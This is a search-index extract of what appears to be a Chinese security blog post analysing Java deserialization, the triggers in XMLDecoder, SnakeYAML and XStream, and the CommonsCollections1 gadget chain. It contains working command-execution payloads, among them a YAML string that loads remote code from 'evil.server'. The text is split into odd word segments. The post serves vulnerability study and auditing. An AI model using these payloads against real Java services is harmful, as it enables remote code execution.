\u7684 \u533a\u522b \u6682\u65f6 \u8fd8 \u6ca1 \u5f04 \u660e\u767d \uff0c \u5f15\u7528 \u7f51\u4e0a \u7684 \u89e3\u91ca   readUnshared \u65b9\u6cd5 \u8bfb\u53d6 \u5bf9\u8c61 \uff0c \u4e0d \u5141\u8bb8 \u540e\u7eed \u7684 readObject \u548c readUnshared \u8c03\u7528 \u5f15\u7528 \u8fd9\u6b21 \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5f97\u5230 \u7684 \u5bf9\u8c61 \uff0c \u800c readObject \u8bfb\u53d6 \u7684 \u5bf9\u8c61 \u53ef\u4ee5 \u3002   \u4f46 \u5176 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4ecd\u7136 \u53ef\u4ee5 \u89e6\u53d1 readObject \u7684 \u8c03\u7528 \uff0c \u6709\u5f85 \u5f04\u6e05 \u6e05\u695a \u5f04\u6e05\u695a \u3002","title":"2 .   \u53cd \u5e8f\u5217\u5316 \u89e6\u53d1 \u70b9 \u6269\u5c55"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#3","text":"readUnshared   \u51fd\u6570 \u7684 \u4f7f\u7528 \u65b9\u5f0f \u540c   readObject   \u7c7b\u4f3c \uff0c \u8fd9\u91cc \u4e0d\u518d \u53d9\u8ff0 \u3002 \u8fd9\u4e00 \u5c0f\u8282 \u4e3b\u8981 \u8bb2 \u5404\u79cd \u89e6\u53d1 \u70b9 \u7684 \u5229\u7528 \u65b9\u5f0f \uff0c \u4e0d \u8bb2 \u5177\u4f53 \u7684 \u539f\u7406 \u3002 \u539f\u7406 \u90e8\u5206 \u7559 \u5230 \u540e\u9762 \u5206\u6790 \u3002","title":"3 .   \u6269\u5c55 \u89e6\u53d1 \u70b9 \u8bd5\u9a8c"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#a-xmldecoderreadobject","text":"public   static   void   main   (   String   [ ]   args   ) {   String   poc   =   \" poc . xml \"   ;   try   {   FileInputStream   file   =   new   FileInputStream   (   poc   ) ;   XMLDecoder   decoder   =   new   XMLDecoder   (   file   ) ;   decoder   .   readObject   ( ) ;   decoder   .   close   ( ) ;   }   catch   (   FileNotFoundException   e   )   {   e   .   printStackTrace   ( ) ;   }   }   poc . xml   < ? xml   version = \" 1.0 \"   encoding = \" UTF - 8 \" ? >   < java >   < object   class =   \" java . lang . ProcessBuilder \"   >   < array   class =   \" java . lang . String \"   length =   \" 3 \"   >   < void   index =   \" 0 \"   >   < string >   / bin / sh   < / string >   < / void >   < void   index =   \" 1 \"   >   < string >   - c   < / string >   < / void >   < void   index =   \" 2 \"   >   < string >   open   / Applications / Calculator . app   < / string >   < / void >   < / array >   < void   method =   \" start \"   / >   < / object >   < / java >   \u6700\u7ec8 \u53ef \u89e6\u53d1 \u547d\u4ee4 \u6267\u884c","title":"a .   XMLDecoder . readObject"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#b-yamlload","text":"\u53c2\u8003 \u94fe\u63a5   \uff0c \u8fd9\u91cc \u6682\u672a \u8bd5\u9a8c   \u6dfb\u52a0 SnakeYAML \u5e93   < ! --   https : / / mvnrepository . com / artifact / org . yaml / snakeyaml   -- >   < dependency >   < groupId >   org . yaml   < / groupId >   < artifactId >   snakeyaml   < / artifactId >   < version >   1.25   < / version >   < / dependency >   public   static   void   main   (   String   [ ]   args   )   {   String   yamlStr   =   \" ! ! javax . script . ScriptEngineManager   [ ! ! java . net . URLClassLoader   \"   +   \" [ [ ! ! java . net . URL   [ \\ \" http : / / evil . server \\ \" ] ] ] ] \"   ;   Yaml   yaml   =   new   Yaml   ( ) ;   Object   obj   =   yaml   .   load   (   yamlStr   ) ;   }   \u8fd9\u91cc \u7684 yamlStr \u53ef\u4ee5 \u7528 https : / / github . com / mbechler / marshalsec \u751f\u6210 \u5371\u5bb3 \u66f4\u5927 \u7684 payload","title":"b .   Yaml . load"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#c-xstreamfromxml","text":"\u53c2\u8003 \u94fe\u63a5   \u6dfb\u52a0 XStream \u5e93   < dependency >   < groupId >   com . thoughtworks . xstream   < / groupId >   < artifactId >   xstream   < / artifactId >   < version >   1.4 . 10   < / version >   < / dependency >   public   static   void   main   (   String   [ ]   args   )   {   / /   expGen ( ) ;   String   payload   =   \" < sorted - set > \\ n \"   +   \"   < string > foo < / string > \\ n \"   +   \"   < dynamic - proxy > \\ n \"   +   \"   < interface > java . lang . Comparable < / interface > \\ n \"   +   \"   < handler   class = \\ \" java . beans . EventHandler \\ \" > \\ n \"   +   \"   < target   class = \\ \" java . lang . ProcessBuilder \\ \" > \\ n \"   +   \"   < command > \\ n \"   +   \"   < string > / bin / sh < / string > \\ n \"   +   \"   < string > - c < / string > \\ n \"   +   \"   < string > open   / System / Applications / Calculator . app < / string > \\ n \"   +   \"   < / command > \\ n \"   +   \"   < / target > \\ n \"   +   \"   < action > start < / action > \"   +   \"   < / handler > \\ n \"   +   \"   < / dynamic - proxy > \\ n \"   +   \" < / sorted - set > \\ n \"   ;   XStream   xStream   =   new   XStream   ( ) ;   xStream   .   fromXML   (   payload   ) ;   }","title":"c .   XStream . fromXML"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#d-67","text":"","title":"d .   \u4e0a\u9762 \u7684 6 \u548c 7 \uff0c \u7559 \u5230 \u540e\u9762 \u5206\u6790"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#4","text":"\u4e0a\u9762 \u4e24\u8282 \u4ecb\u7ecd \u4e86 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u539f\u7406 \uff0c \u5e76 \u6269\u5c55 \u4e86 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9 \u3002 \u5728 \u5b9e\u9645 \u7684 \u5ba1\u8ba1 \u8fc7\u7a0b \u4e2d \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u5173\u6ce8 \u8fd9\u4e9b \u51fd\u6570 \u7684 \u8c03\u7528   (   readObject   |   readUnshared   |   load   |   fromXML   |   readValue   |   parseObject   )   \\   s   *   \\   (   \u5f53\u7136 \u6709\u4e9b \u8fd8 \u9700\u8981 \u770b \u662f\u5426 \u662f\u5426\u662f \u6709 \u6f0f\u6d1e \u7684 \u7248\u672c","title":"4 .   \u5c0f\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x02","text":"\u4e0a\u9762 \u5927\u81f4 \u8bb2\u8bc9 \u4e86 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4f7f\u7528 \u65b9\u6cd5 \uff0c \u672c\u8282 \u5c06 \u8c03\u8bd5 \u4e0a\u9762 \u7684   Employee   \u6848\u4f8b \uff0c \u6765 \u770b\u770b \u5728 \u4ee3\u7801 \u5c42\u9762 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u662f \u600e\u4e48 \u600e\u4e48\u6837 \u7684 \uff01   \u8fd9\u91cc \u4f7f\u7528 \u7684 \u662f   ObjectInputStream   \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65b9\u6cd5   readObject   \u51fd\u6570   \u5176\u5b9e \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u603b\u4f53 \u6765\u8bf4 \u5206\u4e3a \u4e24\u6b65 \uff0c \u4ece \u5b57\u7b26 \u5b57\u7b26\u4e32 \u6d41\u4e2d \u6839\u636e \u5e8f\u5217 \u5e8f\u5217\u5316 \u89c4\u683c \u63d0\u53d6 \u51fa \u53ef\u80fd \u7684 \u7c7b \uff0c \u7136\u540e \u5c06 \u8be5\u7c7b \u4f7f\u7528 \u53cd\u5c04 \u673a\u5236 \u67e5\u627e \u6216 \u521b\u5efa \u4e00\u4e2a \u5b9e\u4f8b \u3002 \u5176\u4e2d \u4e5f \u4f1a \u6709 \u4e00\u4e9b \u68c0\u67e5 \u7684 \u8fc7\u7a0b \uff0c \u8fd9\u91cc \u4f8b\u5b50 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u4e0d \u53d9\u8ff0 \u3002   \u6765\u770b \u4e00\u4e0b \u67e5\u627e \u6216 \u521b\u5efa \u7684 \u8fc7\u7a0b   ObjectInputStream : readObject : 417   \u8ddf\u8fdb ObjectInputStream \u7684 readObject \u7c7b \uff0c \u8be5 \u51fd\u6570 \u4f53\u73b0 \u4e86 \u6574\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c \u5176\u4e2d \u5176 \u4e3b\u8981 \u529f\u80fd \u7684 \u662f   readObject0   \u51fd\u6570   ObjectInputStream : readObject0 : 1515   \u4ece\u6d41 \u4e2d\u8bfb \u53d6\u51fa \u5f53\u524d \u7684 \u7c7b\u578b \uff0c   tc = 115   \u6b64\u65f6 \u4ee3\u8868 Object \u5bf9\u8c61 \uff0c \u4ece\u800c \u8fdb\u5165   readOrdinaryObject   ObjectInputStream : readOrdinaryObject : 2026   \u8be5 \u51fd\u6570 \u4e3b\u8981 \u505a \u4e86 \u5b9e\u4f8b \u5316 \u5bf9\u8c61 \u7684 \u5de5\u4f5c \uff0c \u5176\u4e2d 2033 \u884c \u751f\u6210 \u7684 ObjectStreamClass \u5bf9\u8c61 \uff0c \u4f1a \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u5b9e\u4f8b \u5316 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u7684 \u5bf9\u8c61 \u3002 2044 \u884c \u5b9e\u9645 \u7684 \u83b7\u53d6 \u5230 \u8be5 \u5bf9\u8c61 \u3002   \u5173\u4e8e ObjectStreamClass \u7684 \u529f\u80fd \uff0c \u5b83 \u662f \u7c7b \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u63cf\u8ff0 \u5668 \uff0c \u5305\u542b \u7c7b \u7684 \u540d\u5b57 \u548c \u5e8f\u5217 \u7248\u672c \u7248\u672c\u53f7 \u3002 \u4f7f\u7528 \u5b83 \u7684 lookup \u51fd\u6570 \u53ef\u4ee5 \u8f7d\u5165 \u6216 \u65b0\u5efa \u8be5\u7c7b \uff0c \u4f46 \u8fd9\u91cc \u5b9e\u9645 \u5b9e\u9645\u4e0a \u7528 \u7684 \u662f newInstance \u6765 \u5b9e\u4f8b \u5316 \u5f53\u524d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u63cf\u8ff0 \u5668 \uff0c \u5373 \u4ea7\u751f \u5f53\u524d \u63cf\u8ff0 \u5668 \u6307\u4ee3 \u7684 \u7c7b \u3002   Serialization ' s   descriptor   for   classes .   It   contains   the   name   and   serialVersionUID   of   the   class .   The   ObjectStreamClass   for   a   specific   class   loaded   in   this   Java   VM   can   be   found / created   using   the   lookup   method .   \u5176\u4e2d \u51fd\u6570   readClassDesc   \u5c06 \u4ece \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u63d0\u53d6 \u51fa \u76f8\u5173 \u7684 \u7c7b \u4fe1\u606f \u3002 \u8fd9\u91cc \u5c31 \u76f4\u63a5 \u770b \u5229\u7528 \u53cd\u5c04 \u673a\u5236 \u83b7\u53d6 \u5230 \u7c7b \u7684 \u5730\u65b9 \uff0c \u4f4d\u4e8e   ObjectInputStream . resolveClass   \uff0c \u4e0b\u56fe \u4e3a \u8c03\u7528 \u94fe   ObjectInputStream : resolveClass : 677   \u8fd9\u91cc \u63d0\u53d6 \u4e86 jvm \u4e2d \u5f53\u524d \u8fd9\u4e2a \u6d41\u4e2d \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u7528\u4e8e \u540e\u7eed \u7684 newInstance \u3002   \u6b64\u5904 \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u53cd\u5c04 \u5c31\u662f \u5148 \u901a\u8fc7   Class . forName   \u83b7\u53d6 \u5230 \u5f53\u524d \u63cf\u8ff0 \u5668 \u6240\u6307 \u4ee3 \u7684 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u540e\u7eed \u4f1a \u5728   initNonProxy   \u6216   initProxy   \u51fd\u6570 \u4e2d \u590d\u5236 \u8be5 Class \u5bf9\u8c61 \u7684 \u76f8\u5173 \u4fe1\u606f ( \u5305\u62ec \u76f8\u5173 \u51fd\u6570 ) \uff0c \u6700\u540e \u5728 2044 \u884c\u5904   ObjectStreamClass . newInstance   \u5b9e\u4f8b \u5316\u8be5 \u5bf9\u8c61 \u3002   \u5728 \u5b9e\u4f8b \u5316\u540e \u4f1a\u7528   ObjectInputStream . readSerialData   \u51fd\u6570 \u5c06 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6d41\u4e2d \u7684 \u76f8\u5173 \u6570\u636e \u586b\u5145 \u8fdb \u5b9e\u4f8b \u5316\u540e \u7684 \u5bf9\u8c61 \u4e2d \u6216 \u8c03\u7528 \u5f53\u524d \u7c7b \u63cf\u8ff0 \u5668 \u7684 readObject \u51fd\u6570 \u3002   ObjectInputStream : readSerialData : 2149   \u8fd9\u91cc \u4f1a \u6839\u636e \u5f53\u524d \u7684 \u7c7b \u63cf\u8ff0 \u5668 \u662f\u5426 \u5b58\u5728 readObject \u51fd\u6570 \u6765 \u81ea\u52a8 \u8c03\u7528 \u8be5 \u51fd\u6570 \uff0c \u6216\u8005 \u662f \u586b\u5145 \u5e8f\u5217 \u6d41\u4e2d \u7684 field \u6570\u636e \u3002 \u8fd9\u91cc \u7684 readObject \u7684 \u8c03\u7528 \u5e38\u4e3a \u5229\u7528 \u94fe \u7684 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \uff0c \u4f8b\u5982 CommonsCollections1 \u4e2d \u7684   AnnotationInvocationHandler   \uff0c \u540e\u6587 \u5c06 \u5206\u6790 \u8be5 \u51fd\u6570 \u3002   \u6ce8\u610f \uff1a \u7531\u4e8e \u6211\u4eec \u7528 \u7684 \u662f Serializable \u63a5\u53e3 \uff0c \u6240\u4ee5 \u4e0a\u8ff0 \u5e76\u672a \u63d0\u53ca \u4f7f\u7528 Externalizable \u63a5\u53e3 \u7684 \u60c5\u51b5 \u3002   \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6700\u540e \u8fd4\u56de \u7684 \u5bf9\u8c61 \u5c31\u662f \u6700\u7ec8 \u6211\u4eec \u5f97\u5230 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u7684 \u5bf9\u8c61 \u3002","title":"0x02   \u53cd \u5e8f\u5217\u5316 \u8fc7\u7a0b"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#_1","text":"\u8fd9\u91cc \u5f15\u7528   \u6d45\u8c08 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u4fee\u590d \u65b9\u6848   Java \u7a0b\u5e8f \u4e2d\u7c7b ObjectInputStream \u7684 readObject \u65b9\u6cd5 \u88ab \u7528\u6765 \u5c06 \u6570\u636e \u6570\u636e\u6d41 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3a \u5bf9\u8c61 \uff0c \u5982\u679c \u6d41\u4e2d \u7684 \u5bf9\u8c61 \u662f class \uff0c \u5219 \u5b83 \u7684 ObjectStreamClass \u63cf\u8ff0 \u63cf\u8ff0\u7b26 \u4f1a \u88ab \u8bfb\u53d6 \uff0c \u5e76 \u8fd4\u56de \u76f8\u5e94 \u7684 class \u5bf9\u8c61 \uff0c ObjectStreamClass \u5305\u542b \u4e86 \u7c7b \u7684 \u540d\u79f0 \u53ca serialVersionUID \u3002   \u5982\u679c \u7c7b \u63cf\u8ff0 \u63cf\u8ff0\u7b26 \u662f \u52a8\u6001 \u4ee3\u7406 \u7c7b \uff0c \u5219 \u8c03\u7528 resolveProxyClass \u65b9\u6cd5 \u6765 \u83b7\u53d6 \u672c\u5730 \u7c7b \u3002 \u5982\u679c \u4e0d\u662f \u52a8\u6001 \u4ee3\u7406 \u7c7b\u5219 \u8c03\u7528 resolveClass \u65b9\u6cd5 \u6765 \u83b7\u53d6 \u672c\u5730 \u7c7b \u3002 \u5982\u679c \u65e0\u6cd5 \u89e3\u6790 \u8be5\u7c7b \uff0c \u5219 \u629b\u51fa ClassNotFoundException \u5f02\u5e38 \u3002   \u5982\u679c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \u4e0d\u662f String \u3001 array \u3001 enum \u7c7b\u578b \uff0c ObjectStreamClass \u5305\u542b \u7684 \u7c7b\u4f1a \u5728 \u672c\u5730 \u88ab \u68c0\u7d22 \uff0c \u5982\u679c \u8fd9\u4e2a \u672c\u5730 \u7c7b \u6ca1\u6709 \u5b9e\u73b0 java . io . Serializable \u6216\u8005 externalizable \u63a5\u53e3 \uff0c \u5219 \u629b\u51fa InvalidClassException \u5f02\u5e38 \u3002 \u56e0\u4e3a \u53ea\u6709 \u5b9e\u73b0 \u4e86 Serializable \u548c Externalizable \u63a5\u53e3 \u7684 \u7c7b \u7684 \u5bf9\u8c61 \u624d\u80fd \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u524d\u9762 \u5206\u6790 \u4e2d \u63d0\u5230 \u6700\u540e \u4f1a \u8c03\u7528   resolveClass   \u83b7\u53d6 \u7c7b \u7684 Class \u5bf9\u8c61 \uff0c \u8fd9 \u662f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u4e00\u4e2a \u91cd\u8981 \u7684 \u5730\u65b9 \uff0c \u4e5f \u662f \u5fc5\u7ecf \u4e4b\u8def \u5fc5\u7ecf\u4e4b\u8def \uff0c \u6240\u4ee5 \u6709 \u7814\u7a76 \u4eba\u5458 \u63d0\u51fa \u901a\u8fc7 \u91cd\u8f7d   ObjectInputStream   \u7684   resolveClass   \u6765 \u9650\u5236 \u53ef\u4ee5 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b","title":"\u5c0f\u7ed3"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#0x03","text":"\u540c PHP \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e00\u6837 \uff0c \u5355\u5355 \u53d1\u73b0 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u89e6\u53d1 \u70b9 \u5e76 \u4e0d\u80fd \u9020\u6210 \u4e25\u91cd \u7684 \u5f71\u54cd \u3002 \u5f80\u5f80 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5371\u5bb3 \u7a0b\u5ea6 \u53d6\u51b3 \u53d6\u51b3\u4e8e \u540e\u7eed \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u6240\u80fd \u94fe\u6240\u80fd \u8fbe\u5230 \u7684 \u5371\u9669 \u7a0b\u5ea6 \u3002 \u5728 java \u4e2d   ysoserial   \u5de5\u5177 \u7ed9 \u6211\u4eec \u63d0\u4f9b \u4e86 \u8bb8\u591a \u5e38\u89c1 \u7684 \u5e93\u5b58 \u5728 \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9 \u4e00\u8282 \u5c06 \u9010\u4e00 \u5206\u6790 \u8fd9\u4e9b \u5229\u7528 \u94fe \u3002","title":"0x03   \u5229\u7528 \u94fe \u53d1\u6398"},{"location":"blog/2019/study-java-deserialized-commonscollections3-1-20191024/#1-commonscollections1jdk7","text":"\u53c2\u8003 \u94fe\u63a5   Apache   Commons   Collections \u662f \u4e00\u4e2a \u6269\u5c55 \u4e86 Java \u6807\u51c6 \u5e93\u91cc \u7684 Collection \u7ed3\u6784 \u7684 \u7b2c\u4e09 \u4e09\u65b9 \u7b2c\u4e09\u65b9 \u57fa\u7840 \u5e93 \uff0c \u5b83 \u63d0\u4f9b \u4e86 \u5f88\u591a \u6709\u529b \u5f3a\u6709\u529b \u7684 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \u7c7b\u578b \u5e76\u4e14 \u5b9e\u73b0 \u4e86 \u5404\u79cd \u96c6\u5408 \u5de5\u5177 \u7c7b \u3002 \u4f5c\u4e3a Apache \u5f00\u6e90 \u9879\u76ee \u7684 \u91cd\u8981 \u7ec4\u4ef6 \uff0c Commons   Collections \u88ab \u5e7f\u6cdb \u5e94\u7528 \u5e7f\u6cdb\u5e94\u7528 \u4e8e \u5404\u79cd Java \u5e94\u7528 \u7684 \u5f00\u53d1 \u3002   CommonsCollection1 \u7684 \u5206\u6790 \u6587\u7ae0 \u6bd4\u8f83 \u591a \uff0c \u521a \u5f00\u59cb \u5148 \u4ece \u8fd9\u4e2a gadget \u5f00\u59cb \u5206\u6790 \u3002 \u8fd9\u91cc \u6211\u7528 \u7684 \u5206\u6790 \u65b9\u6cd5 \u5206\u6790\u65b9\u6cd5 \u662f \u5148 \u5199 \u4e00\u4e2a \u89e6\u53d1 \u70b9 \uff0c \u7136\u540e \u7528 ysoserial \u751f\u6210 payload \u6765 \u8c03\u8bd5 \u3002   CommonsCollections1   payload \u9488\u5bf9 \u7684 commons - collections   3.1 \u7248\u672c \uff0c \u5148 \u5f15\u5165 \u5e93   < ! --   https : / / mvnrepository . com / artifact / commons - collections / commons - collections   -- >   < dependency >   < groupId >   commons - collections   < / groupId >   < artifactId >   commons - collections   < / artifactId >   < version >   3.1   < / version >   < / dependency >   \u5728 ysoserial \u7684 exp \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u4e00 \u6574\u4e2a \u8c03\u7528 \u7684 \u94fe   \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u5229\u7528 \u94fe \u7684 \u6700\u540e \u8c03\u7528 \u4e86   Runtime . getRuntime ( ) . exec ( )   \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u5728 \u524d \u4e00\u6b65 \u7684 \u94fe \u4e0a \u53ef\u4ee5 \u8fbe\u5230 \u8c03\u7528 \u4efb\u610f \u7c7b \u548c \u65b9\u6cd5 \u7684 \u51fd\u6570 \u3002   CommonsCollections1 \u7528 \u7684 \u5c31\u662f 3.1 \u7248\u672c \u4e0b \u7684   InvokerTransformer . transform ( )   public   Object   transform   (   Object   input   )   {   if   (   input   = =   null   )   {   return   null   ;   }   try   {   Class   cls   =   input   .   getClass   ( ) ;   Method   method   =   cls   .   getMethod   (   iMethodName   ,   iParamTypes   ) ;   return   method   .   invoke   (   input   ,   iArgs   ) ;   }   catch   (   NoSuchMethodException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   does   not   exist \"   ) ;   }   catch   (   IllegalAccessException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   cannot   be   accessed \"   ) ;   }   catch   (   InvocationTargetException   ex   )   {   throw   new   FunctorException   (   \" InvokerTransformer :   The   method   ' \"   +   iMethodName   +   \" '   on   ' \"   +   input   .   getClass   ( )   +   \" '   threw   an   exception \"   ,   ex   ) ;   }   }   \u6b64\u5904 \u7528 \u7684 \u5c31\u662f Java \u7684 \u53cd\u5c04 \u673a\u5236 \uff0c \u52a8\u6001 \u8c03\u7528 \u7c7b \u548c \u65b9\u6cd5 \u3002 \u4e3a\u4e86 \u80fd \u52a8\u6001 \u8c03\u7528 \u4efb\u610f \u7c7b \u51fd\u6570 \uff0c \u6211\u4eec \u8fd8 \u5f97 \u63a7\u5236   iMethodName \u3001 iParamTypes \u3001 iArgs   \uff0c \u8be5\u7c7b \u5c5e\u6027 \u5b9a\u4e49 \u5728 InvokerTransformer \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u4e0a   public   InvokerTransformer   (   String   methodName   ,   Class   [ ]   paramTypes   ,   Object   [ ]   args   )   {   super   ( ) ;   iMethodName   =   methodName   ;   iParamTypes   =   paramTypes   ;   iArgs   =   args   ;   }   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31 \u8ddf php \u7c7b\u4f3c \u4e86 \uff0c \u627e \u4e00\u4e2a \u7c7b \uff0c \u5b83 \u7684 \u7c7b \u5c5e\u6027 \u53ef\u63a7 \uff0c \u4e14 \u8be5\u7c7b \u5c5e\u6027 \u540e\u7eed \u8fd8\u4f1a \u8c03\u7528 transform \u51fd\u6570 \u3002 \u7531\u4e8e \u5b8c\u6210   Runtime . getRuntime ( ) . exec ( )   \u52a8\u4f5c \u9700\u8981 \u591a\u6b21 \u8c03\u7528 transform \u51fd\u6570 \uff08 \u5148 \u8c03\u7528 Runtime . getRuntime \u518d \u8c03\u7528 Runtime . exec \uff09 \uff0c \u6240\u4ee5 \u8fd8 \u5f97 \u627e \u4e00\u4e2a \u80fd \u591a\u6b21 \u8c03\u7528 transform \u7684 \u5730\u65b9 \uff0c \u6765\u770b \u4e00\u4e0b   ChainedTransformer   private   final   Transformer   [ ]   iTransformers   ;   / /   \u586b\u5145 \u6784\u9020 \u540e \u7684 \u5b9e\u4f8b   public   Object   transform   (   Object   object   )   {   for   (   int   i   =   0   ;   i   <   iTransformers   .   length   ;   i   ++   )   {   object   =   iTransformers   [   i   ]   .   transform   (   object   ) ;   / /   \u8c03\u7528 \u94fe \uff0c   }   return   object   ;   }   \u5728   Transformer   \u7684 \u5b50\u7c7b \u4e0b\u9762 \u627e\u5230 \u80fd \u751f\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u5229\u7528 \u94fe \u5373\u53ef \uff0c \u6765 \u5206\u6790 \u4e00\u4e0b CommonCollections1 \u7684 \u6784\u9020   / /   real   chain   for   after   setup   final   Transformer   [ ]   transformers   =   new   Transformer   [ ]   {   new   ConstantTransformer   (   Runtime   .   class   ) ,   / /   \u83b7\u53d6 Runtime \u5bf9\u8c61   new   InvokerTransformer   (   \" getMethod \"   ,   new   Class   [ ]   {   / / \u83b7\u53d6 Runtime . getRuntime ( ) \u65b9\u6cd5 \u5bf9\u8c61   String   .   class   ,   Class   [ ]   .   class   } ,   new   Object   [ ]   {   \" getRuntime \"   ,   new   Class   [   0   ]   } ) ,   new   InvokerTransformer   (   \" invoke \"   ,   new   Class   [ ]   {   / /   \u53cd\u5c04 \u8c03\u7528 invoke , \u518d invoke \u6267\u884c Runtime . getRuntime ( ) \u65b9\u6cd5 \uff0c \u83b7\u53d6 Runtime \u5b9e\u4f8b \u5316 \u5bf9\u8c61   Object   .   class   ,   Object   [ ]   .   class   } ,   new   Object   [ ]   {   null   ,   new   Object   [   0   ]   } ) ,   new   InvokerTransformer   (   \" exec \"   ,   / /   \u53cd\u5c04 \u8c03\u7528 exec \u65b9\u6cd5 \uff0c \u6267\u884c \u6700\u7ec8 \u7684 \u547d\u4ee4   new   Class   [ ]   {   String   .   class   } ,   execArgs   ) ,   new   ConstantTransformer   (   1   )   } ;   \u94fe \u7684 \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u7ed3\u70b9 \u9009\u7528 \u7684 \u662f   ConstantTransformer   \uff0c \u5176 transformer \u76f4\u63a5 \u8fd4\u56de \u6784\u9020 \u65f6 \u7684 \u5bf9\u8c61   private   final   Object   iConstant   ;   / /   \u6b64\u65f6 iConstant \u7f6e \u4e3a Runtime . class   public   ConstantTransformer   (   Object   constantToReturn   )   {   super   ( ) ;   iConstant   =   constantToReturn   ;   }   public   Object   transform   (   Object   input   )   {   / /   \u76f4\u63a5 \u8fd4\u56de Runtime . class   return   iConstant   ;   }   \u6700\u7ec8 \u7684 \u8c03\u7528 \uff0c \u7c7b\u4f3c   Object   obj   =   Runtime   .   class   ;   Class   cls   =   obj   .   getClass   ( ) ;   Method   method   ;   method   =   cls   .   getMethod   (   \" getMethod \"   ,   new   Class   [ ]   {   String   .   class   ,   Class   [ ]   .   class   } ) ;   obj   =   method   .   invoke   (   obj   ,   new   Object   [ ]   {   \" getRuntime \"   ,   new   Class   [   0   ]   } ) ;   cls   =   obj   .   getClass   ( ) ;   method   =   cls   .   getMethod   (   \" invoke \"   ,   new   Class   [ ]   {   Object   .   class   ,   Object   [ ]   .   class   } ) ;   obj   =   method   .   invoke   (   obj   ,   new   Object   [ ]   {   null   ,   new   Object   [   0   ]   } ) ;   cls   =   obj   .   getClass   ( ) ;   method   =   cls   .   getMethod   (   \" exec \"   ,   new   Class   [ ]   {   String   .   class   } ) ;   method   .   invoke   (   obj   ,   new   String   [ ]   {   \" open   / System / Applications / Calculator . app \"   } ) ;   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u95ee\u9898 \u662f \u5982\u4f55 \u89e6\u53d1   ChainedTransformer   \uff1f \u641c\u7d22 \u4e00\u4e0b \u8c03\u7528 transform \u7684 \u4f4d\u7f6e \uff0c \u6392\u9664 \u6389 xxxTransformer \u7c7b \uff0c \u6700\u6709 \u53ef\u80fd \u88ab \u5229\u7528 \u7684 \u5c31\u662f   LazyMap . get   \u3001   TransformedMap . checkSetValue   \uff0c \u5176\u4e2d checkSetValue \u4f1a \u5728 setValue \u51fd\u6570 \u88ab \u8c03\u7528 \u7684 \u65f6\u5019 \u8c03\u7528 \u3002   